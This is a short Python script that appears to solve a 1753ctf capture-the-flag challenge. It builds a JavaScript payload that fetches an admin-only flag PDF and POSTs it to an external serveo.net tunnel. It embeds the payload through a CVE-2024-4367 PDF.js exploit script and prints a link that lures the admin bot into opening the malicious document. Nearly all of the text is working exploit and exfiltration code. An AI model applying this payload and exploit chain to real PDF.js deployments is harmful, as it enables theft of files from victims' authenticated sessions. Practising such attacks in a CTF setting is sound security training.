import os

public_url = "https://4d60e4beb09c01e8828fd6b7b166b965.serveo.net"

payload = f"""
fetch("/app/admin/flag.pdf")
    .then(res => res.blob())
    .then(blob=>
        fetch(
            "{public_url}/flag",
            {{
                method: "POST",
                body: blob,
                headers: {{"Content-Type": "application/pdf"}}
            }}
        )
    )
"""

payload = payload.replace(" ", "").replace("\n", "")
print(payload)
os.system(f"python3 CVE-2024-4367.py '{payload}'")

print(f"Report to admin: https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document={public_url}/pdf")
